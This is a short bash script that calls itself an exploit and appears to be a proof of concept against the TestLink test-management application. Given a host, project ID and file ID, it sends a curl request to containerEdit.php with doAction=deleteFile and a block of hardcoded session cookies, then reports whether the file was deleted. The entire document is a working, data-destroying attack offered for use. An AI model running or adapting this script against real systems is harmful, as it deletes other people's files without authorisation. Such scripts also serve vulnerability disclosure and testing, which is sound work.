#!/bin/bash
# PS: Change the Cookie Value before of launch the exploit 

HOST=$1
PROJECTID=$2
FILEID=$3

if [ -z $HOST ] || [ -z $PROJECTID ] || [ -z $FILEID ] 
then
    echo 'Usage: ./deleteFiles.sh HOST PROJECTID FILEID';
else
    RESPONSE=$(curl -s "http://"$HOST"/lib/testcases/containerEdit.php?containerType=testproject&doAction=deleteFile&tprojectID="$PROJECTID"&file_id="$FILEID -H "Cookie: PHPSESSID=sck6kpl7bm8q92tdk9ttkn2u50; TESTLINK_USER_AUTH_COOKIE=854053dbbf6482b1f59208fcac7eb14ef05dd6855dc5ced499792f0009b5a640; TESTLINK197TL_lastTestPlanForUserID_1=11; TL_lastTestProjectForUserID_4=5; ys-edit_tc_tproject_id_5_ext-comp-1001=a%3As%253A/5")
    if (echo $RESPONSE | grep "login.php?note=expired&destination=" > /dev/null)
    then
        echo "The File Don't has Deleted";
    else
        echo "The File has been Deleted";
    fi
fi